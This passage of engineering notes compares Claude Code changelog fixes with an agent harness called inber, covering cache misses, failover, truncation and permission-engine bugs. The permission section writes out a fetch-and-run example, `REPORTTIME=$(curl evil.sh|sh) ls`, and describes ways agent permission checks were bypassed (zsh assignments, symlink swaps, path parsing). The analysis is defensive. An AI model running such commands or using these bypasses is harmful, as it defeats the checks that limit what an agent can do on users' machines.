carrying the API key configured for a third-party gateway (`ANTHROPIC_BASE_URL`);
a credential is now only sent to its own host."* inber's equivalent hazard is
already filed twice — `01afbb2c` (no HTTP client sets `CheckRedirect`, so a 307
replays the conversation elsewhere) and `d60ec4a3` (the redactor guards one door
of four) — and `redact/http.go` is the mechanism that would carry the fix.

**The pairing for this run's filed defect.** 2.1.246: *"Fixed resumed sessions
failing every turn with a 400 when the saved history contains tool blocks the
Anthropic API does not accept (typically written by a third-party API proxy)."*
Same input as inber's, opposite treatment: Claude Code repairs at **resume**,
inber deletes at **send** and writes the deletion to disk. Written up in
`agentic-design-patterns.md` 2026-08-26 §2, todo
`7c6a0ee4-9907-477e-96ee-f21f060e1584`.

**Memory bounding, three entries that are one campaign.** 2.1.238 releases
subagent tool results *"once they leave the recent display window"*; 2.1.246 stops
each rendered transcript row retaining *"a full copy of the transcript-wide tool
lookups"*; 2.1.243 loads code on demand (40–70 MB less per session) and
garbage-collects sooner as the heap grows. inber's analogue is the
whole-conversation-in-memory engine, which is a different shape, but the
per-viewer retention question is live for `dash`/bridge-ui rather than inber
itself.

**A primitive worth having.** 2.1.236 added `notify_when_idle` to cross-session
`SendMessage` — *"ask another Claude Code session on this machine to send one
notice when it next goes idle — opt-in, one-shot, no polling."* inber's spawn
completion is already push (`deliverResult` / `SpawnCompleted`), so the parent
case is covered; the uncovered case is a **steer**, where
`server/spawn_tools.go:48` answers *"Message injected into %s mid-turn"* and the
caller never hears again. That is the same missing edge the 08-25 entry recorded
under codex #40449's initiator concept, and one field serves both.

**Also new, no inber surface.** An Auto mode tab in `/permissions` for viewing and
editing classifier rules, and a safety-check deadline that scales with prompt
size (2.1.246). `modelPicker` and `modelPricing` settings, and a `/usage` Loops
breakdown (2.1.243). *"Fixed a severe transcript slowdown when a diff contained a
very long single line (e.g. a base64 string)"* (2.1.246) — the same input as cline
#13525, hit in a renderer instead of a search tool, which is worth noting because
it is the third harness this month to meet the giant-single-line file.

**Routine, recorded so it is not re-read.** The bulk of 2.1.238, 2.1.243 and
2.1.246 is terminal rendering (fullscreen repaint, scroll, resize, focus-click,
theme colours, mouse reports), keybinding and vim-mode edge cases, `/resume` and
session-picker behaviour, Remote Control connection resilience (a dozen-plus
entries), plugin install/update plumbing, BOM handling, `NO_PROXY` casing, and
VS Code extension polish. Operational note: 2.1.243's native binary is
zstd-compressed, ~75 MB instead of ~340 MB on Linux x64.

---

## 2.1.247 — 2026-08-26

The only version newer than the 2.1.236–2.1.246 run above. Six entries carry
something; the rest is plugin-marketplace and markdown-rendering hardening.

**A subagent must not die on a first-call model 404.** *"Fixed sub-agents dying
on a first-call model 404: they now use the session's fallback model chain, and
the error returned to the parent includes the error type, status, request id, and
model."* Two rules in one line, and inber fails both. Its fallback chain
(`engine/failover.go:63-76`) is consulted once, **before** the request, in
`selectModel` (`engine/turn_execute.go:18`), gated on a 30-minute health window;
nothing re-enters it after a call fails, and the only post-failure retries are
same-model. A spawn is a single turn (`server/spawn.go:307`), so the
`RecordError` written at `failover.go:118` helps some later session and never
this child. And the error is flattened to a string at `server/spawn.go:319` with
no field on `SpawnResult` to hold a type, a status or a request id; the repo
makes **zero `errors.As` calls**, so `*anthropic.Error`'s `StatusCode` and
`RequestID` are never read. Written up in `agentic-design-patterns.md` under
2026-08-27 §5.

**Megabytes of hook output must not wedge the session.** inber caps ordinary
tool results well — `ModifyToolResult` → `Session.TruncateToolResult` →
head/tail with an explicit `[... truncated %d tokens (%d lines) ...]` marker
(`session/truncate.go:119-130`), on by default. Two gaps: `ModifyToolResult` is
wired only inside `if e.Session != nil` (`engine/build_hooks.go:116`), so a
session-less engine appends every result uncapped; and the workflow-hook path
appends `PostToolResult` output raw (`agent/agent_run.go:425-430`) from producers
that interpolate unbounded `CombinedOutput()`. ⚠️ That second path is **dead**,
not live — `engine/workflow_hooks.go:69` gates on `write_file`/`edit_file`
(singular) while the registered tools are `write_files`/`edit_files` (plural), so
it always returns `""`. That matches open todo `af237d64`; the bound is a
precondition for re-arming it, not a live bug.

**When output is lost, say where.** inber is already strong here and states the
policy: every truncation site names what was lost
(`conversation/manage_tool_pruning.go:38-43,139-147`), and
`session/session_logging.go:82-95` documents why the untruncated copy is
deliberately not retained. Two silent drops remain — a summarization failure is
`Log.Warn`-only with the model never told (`engine/lifecycle.go:105-108`), and
`SavedTokens` is computed and discarded (`session/session_logging.go:64-74`).

**A summary must be written under the conversation's own system prompt.**
*"Fixed `/compact` and 'Summarize from here' in sessions started with `--agent`
summarizing under the default system prompt instead of the conversation's own."*
inber has this more absolutely: the prompt is not defaulted, it is unplumbed —
`conversation/summary_generation.go:40-71` hardcodes a literal and neither
`generateSummary` nor `SummarizeConversation` has a parameter to receive one. The
session's real prompt is on the Engine at compaction time
(`engine/turn_prepare.go:111`) and is not read. Held against open todo
`421a8162`; the adjacent finding that `CompactContext`'s `summary` argument is
never referenced is in `agentic-design-patterns.md` 2026-08-27 §5.

**Tell the model a server failed, or it concludes the tools do not exist.** No
live inber surface — `tools/mcp/` has zero importers repo-wide, re-verified this
pass. The transferable gap is that inber has no way at all to say "a tool you
expect exists but is unavailable"; `SetDisabledTools` removes tools from the wire
silently. Two latent defects confirmed in the dormant package: the
`bufio.NewScanner` at `tools/mcp/client.go:155` sets no `scanner.Buffer`, so a
line over 64 KiB wedges the client permanently rather than failing one call; and
`c.stderr` is created, stored and never read, so a server writing over 64 KiB to
stderr blocks forever.

**Auto-compact at the model's real window.** *"Changed Sonnet 5's default
auto-compact window to its full 1M context… about 967K tokens instead of about
934K."* inber already does this honestly: the window comes from model-store, and
`requestableContextWindow` (`agent/models.go:107-122`) bounds it by what inber's
client can actually request, reporting once per model when it caps. Note inber's
pruning budget is a flat `contextWindow / 2` (`engine/build.go:121`), far more
conservative than 96.7% — a tuning observation, not a defect.

Also new and without an inber analogue: plugin marketplace names containing
control or invisible characters are rejected and marketplace text is escape-safe,
and markdown hyperlinks pointing at network or automounter paths, or leading with
invisible characters, now render as plain text. inber has essentially no
control-character validation on externally supplied names — the only such check
repo-wide is `strings.ContainsAny(value, " \t\r\n")` at `redact/redact.go:220`.

## Harness-watch — 2026-09-03 (CC 2.1.248–2.1.259): the tool block is the cache prefix, and four separate things re-rendered it this week

Twelve releases since the 2.1.247 entry above. ⚠️ **2.1.257 and 2.1.258 were
already screened** on 2026-09-01 — `agentic-design-patterns.md:9255-9257` records
three of their entries and dismisses them — so the genuinely unscreened range is
**2.1.248–2.1.256 and 2.1.259**, and the two 2.1.257 items cited below are ones
that pass named but did not reach. Most of the window is Windows, terminal and
gateway plumbing. Four entries share one root and are the reason this section
exists.

**Four cache misses, one cause: a tool definition changed for a reason that was
not the conversation.** 2.1.248 fixed *"a prompt-cache miss (and lost
extended-thinking context) roughly once an hour in long sessions, caused by tool
definitions being re-rendered after an OAuth token refresh"* and *"the
`ScheduleWakeup` tool definition changing between a session and its `--resume`
when the account had entered usage overage"*; 2.1.257 fixed *"Remote Control
connecting mid-session re-sending the Bash tool definition, causing a
prompt-cache miss"*; 2.1.259 fixed *"the prompt cache being invalidated when the
OAuth token refreshed in sessions with telemetry disabled"*. A token refresh, an
account's billing state, and a client attaching are none of them things the model
said, and all four moved bytes inside the cached prefix.

inber has already learned the general lesson and says so where it matters:
`server/agent_names.go:5-20` states that the spawn tool description sits in the
block carrying the `cache_control` breakpoint (`agent/agent_run.go:34-36`), so
the agent list is sorted rather than map-ranged, and `server/spawn_tools.go:63-72`
repeats the reasoning at the call site. That guard covers the server's own spawn
tool.

⚠️ It does **not** cover the CLI's. `agent/registry/spawn_tool.go:46-56` builds
the same kind of description — `"Agent name to spawn. Valid options: %s"` — from
`fetchRegistryAgents()`, an HTTP GET with a 2-second timeout
(`spawn_tool.go:26-31`), and it does two things the server path deliberately does
not: it preserves whatever order the response arrived in rather than sorting, and
on any error it returns a **different string** (`"Must match a registered
agent."`). So the bytes under the breakpoint depend on whether an HTTP call
succeeded, and on a remote service's row order. That is the `ScheduleWakeup` bug
exactly. It is **latent, not live**: the URL is `http://localhost:8101/api/agents`
— dash, not inber's own server — which serves the SPA's HTML, so
`json.Unmarshal` fails and the fallback string is returned every time,
deterministically by accident. Already filed as `a6fceed2`; the prefix hazard is
a second reason to fix it, not a new todo.

- **What inber should consider:** when `a6fceed2` is fixed, the fix has to sort
  the names and keep the two branches byte-identical in shape, or repairing the
  registry lookup will *introduce* the cache miss it currently cannot cause.

**A prompt-cache line in `/cost` is the check inber cannot run.** 2.1.251 added
*"a per-session prompt-cache line to `/cost` (hit ratio, misses, tokens
re-cached, warm/cold) and a matching `prompt_cache` object for status line
scripts"*. inber records cache reads and writes on the main turn path
(`engine/turn_postprocess.go:87`, `engine/engine.go:295`) — but two API calls
never reach it at all. `conversation/summary_generation.go:74` and
`conversation/extract.go:81` call `client.Messages.New` directly, bypassing
`agent/agent_run.go`'s hook dispatch, and both discard `response.Usage`:
`generateSummary` returns `(summary, cutOffAtTokenLimit, err)` and nothing else.
The only two recording sites in the repo are the two above, both on the turn
path, and the only SDK middleware installed is redaction
(`agent/redaction.go:55-58`), so there is no client-level accounting either.
Measured on this host's session logs: **13 summarize events, every one of them
`cost_usd: 0`**, against ordinary message entries carrying real per-turn costs up
to $0.018. Filed this run.

**Deny-by-default became a named mode.** 2.1.248 added `--restricted` (drops the
tools that run commands or code, keeps file tools inside the working directory,
refuses `bypassPermissions`, ignores user/project/local settings files) and
2.1.259 added `--permission-prompts none` for unattended headless hosts —
*"anything that would prompt is denied automatically while the active permission
mode keeps deciding"*. 2.1.257 added `permissions.blockReadsOutsideWorking-
Directories` and a Containment Escape rule so cloud metadata-credential fetches
and cross-tenant reach stop being auto-approved.

inber's `guard` is a real gate, not a spend meter only: `guard.CheckTool` returns
`Allowed` / `Denied` / `NeedsApproval` (`guard/guard.go:165`) and is wired into
the live path at `engine/build_hooks.go:94`. What it lacks is the approver —
`ApprovalFunc` has **zero non-test assignments**, so `Assist` refuses every
dangerous tool and tells the model why (`build_hooks.go:98`). That is not a
defect and the code says so at `build_hooks.go:84-87`: refusing is a true answer
and running would be a false one. What CC added is the *name* for it. inber's
`Assist` currently behaves as `--permission-prompts none` by omission rather than
by choice, and the two are indistinguishable from outside.
See `agentic-design-patterns.md` 2026-09-03 §1.

**Also new, no inber analogue, worth knowing:**

- 2.1.259 *"Fixed `--resume` failing (and `--continue` opening an empty
  conversation) when a saved session contains an attachment entry with no
  payload"* and 2.1.248 *"Fixed `claude agents` crashing on launch when the
  PR-status cache held a malformed entry"* — one bad record killing a whole
  replay, twice in twelve releases. Cross-cut with codex in
  `agentic-design-patterns.md` 2026-09-03 §2.
- 2.1.251 *"Fixed file tools (Read, Write, Edit) following a symlink swapped
  inside the working directory after the permission check"* — a TOCTOU between
  the check and the open. inber's file tools come from tool-store, so the gap, if
  any, is not in this repo.
- 2.1.251 *"Fixed conversations getting stuck on `text content blocks must be
  non-empty` errors after a turn where the model produced only thinking"* — the
  same wire error inber's assistant-branch filter can produce, already open as
  `b0f47ede`. Independent confirmation that the failure is terminal for the
  session, not a one-turn blip.
- 2.1.251 *"Fixed Opus 5 requests failing with `effort … is not supported when
  thinking is disabled` when effort was xhigh/max"* — CC now downgrades effort to
  `high` in that case. inber's mismatch is the other one, budget against
  `max_tokens`, already open as `79b8f9e5`.
- 2.1.257's mid-stream subagent continuation was already dismissed on 2026-09-01
  (`agentic-design-patterns.md:9255-9257`) as landing on filed findings. Adding
  only what that pass did not say: inber's spawn sets `status := "success"` as
  the *initial* value and changes it only on `context.DeadlineExceeded` or a
  non-nil error (`server/spawn.go:307-320`), so a stream cut short returns
  whatever text arrived and the child reports success. That is the same defect
  arXiv:2608.23623 is built to catch — see `docs/papers/2026-09-harness-research.md`
  2026-09-03 §5.
- 2.1.248 improved *"the Workflow tool's prompt footprint: its description is now
  about 1k tokens instead of 5.7k, with the script-writing reference moved into a
  bundled skill"* — a 4.7k-token reference moved out of the always-resident
  prefix and behind a load. The same trade inber's `docs/reference-based-prompt-
  architecture.md` describes.

## Harness-watch — 2026-09-04 (CC 2.1.260): the permission engine spent a release being wrong about paths, and one tightening from 2.1.259 was pulled back out

One version landed since the 09-03 sweep, and it is dense: 68 bullets in
`2.1.260`, with the largest coherent cluster on the **permission engine and
sandbox**. Nothing in the repo's own commits carries anything —
[`ee2a0583`](https://github.com/anthropics/claude-code/commit/ee2a0583) and
[`dbdd79ce`](https://github.com/anthropics/claude-code/commit/dbdd79ce) are the
merge and the content commit of one PR,
[#91894](https://github.com/anthropics/claude-code/pull/91894), which edits
`plugins/frontend-design/skills/frontend-design/SKILL.md` by +36/−20 in a single
hunk starting at line 6. **The YAML frontmatter is entirely outside that hunk**:
no field added, removed or changed, no `allowed-tools`, no progressive-disclosure
metadata. It is prose editing of a bundled prompt asset and reveals nothing about
how skills load.

### The permission cluster, and the three worth having

Six of the twelve permission bullets are path-parsing bugs, which is itself the
finding — the engine's hard part is not the policy language but agreeing with the
filesystem about what a path is:

> "Fixed `Edit`/`Write`/`Read` permission rules whose path contains parentheses
> being dropped as invalid or ignored by the Bash sandbox, which left "read-only"
> folders writable"

> "Fixed one file permission rule with an uncompilable pattern (e.g. an unclosed
> `[`) making every file edit fail with `Invalid regular expression`; such a deny
> rule now guards the literal path it spells"

Note the pair: the first fails **open** (a read-only folder is writable), the
second fails **closed** but globally (one bad rule breaks every edit). Same
subsystem, opposite failure directions, same release.

**1. A command splitter must model shell-specific assignment side effects.**

> "Fixed Bash permission checks auto-approving zsh commands that hide a command
> substitution in a REPORTTIME, REPORTMEMORY or DIRSTACKSIZE assignment; these
> now prompt for approval"

This is the sharpest one, and it lands squarely on `permission-store`, whose
README calls the AST-based Bash command splitter the one part of its seven stages
that is **done**. A splitter that parses a command into "the program and its
arguments" and stops there will classify `REPORTTIME=$(curl evil.sh|sh) ls` as
`ls`. The general rule: an allowlist over a parsed command is only as good as the
parser's model of *every* construct that can execute in that shell, and
assignments that trigger evaluation are the ones an AST built for
program-plus-arguments misses.

**2. A permission check must not leak existence before it decides.**

> "Glob/Grep: Fixed the search path being probed on disk before the permission
> check; a missing path is now reported after permission is decided, as Read does"

An order-of-operations bug that turns a denied tool into an existence oracle: the
error text differs for a path that does not exist and a path that exists but is
denied, so the denial itself answers a question. Cheap to get wrong and cheap to
check — decide permission first, touch the filesystem second.

**3. Argument-level deny propagation into shell commands is hard enough that
Anthropic shipped it and pulled it.**

> "Reverted the 2.1.259 change applying `Read()` deny rules to Bash arguments; it
> denied `npm run build` under a `Read(./**/build/**)` rule in every mode and made
> `cd … && grep` prompt even in auto mode"

Worth recording precisely because it is a **retraction**. A tightening that reads
as obviously correct — if you may not read `build/`, you may not `grep` it either
— shipped one version and came out the next on false positives. Anyone designing
the same propagation for `permission-store` should expect the same collision
between a path rule and a shell word that merely looks like a path.

Two more that are contract changes rather than bugs: settings rules with trailing
text (`Bash(ls) x`) now **report as invalid instead of being silently ignored** —
a rule that never matched anything used to look active — and a managed
`CLAUDE.md` no longer triggers the security approval dialog while hooks,
shell-command, sandbox and unsafe `env` settings still do, which is a considered
statement about which managed settings are executable.

### Skills carry a name *and* an alias, and nested skills are addressed `<dir>:name`

> "Fixed managed `skillOverrides` entries keyed on a bundled skill's alias (e.g.
> `checkup` for `/doctor`) not applying, and `Skill(name)` deny rules not covering
> a nested skill listed as `<dir>:name`"

The one structurally interesting datum this release, and it is in the changelog
rather than the SKILL.md commit. A skill has a canonical name and at least one
alias, and a deny rule keyed on one does not cover the other — the classic
name-join failure, in a security rule. `skill-store` joins on ids, so the
equivalent hole is not open here, but the alias question is real for anything that
addresses a skill by the string a user types.

### Caching and context, for the record

> "Added a likely cause for prompt-cache misses (e.g. tool definitions or system
> prompt changed, idle past the TTL) to `/cost` and the status line's
> `prompt_cache` field"

> "Fixed prompt caching on Claude Fable 5.1 not covering the context attached
> after tool results, so it was re-sent as uncached input on every tool-call turn"

The first is the diagnostic the 09-03 entry already noted inber cannot run;
nothing has changed there. The second is worth a line next to the goose #11429
finding at `goose.md:1784` and inber's open `a5b91a47` — a third harness
independently discovering that **the context appended after tool results is the
part the cache stops covering**. Three harnesses, one failure, and inber's version
(breakpoints set once at turn start and never advanced) is the most severe of the
three because it is unconditional rather than model-specific.

- **What inber should consider:** nothing here is an inber defect, and none of it
  is filed. The two carryable items are for `permission-store` rather than this
  repo — model shell-specific evaluating constructs in the splitter, and decide
  permission before touching the filesystem — plus one piece of evidence for a
  decision already open: CC's third independent discovery of the
  cache-after-tool-results gap strengthens the case for `a5b91a47` without
  settling which breakpoint gives way.
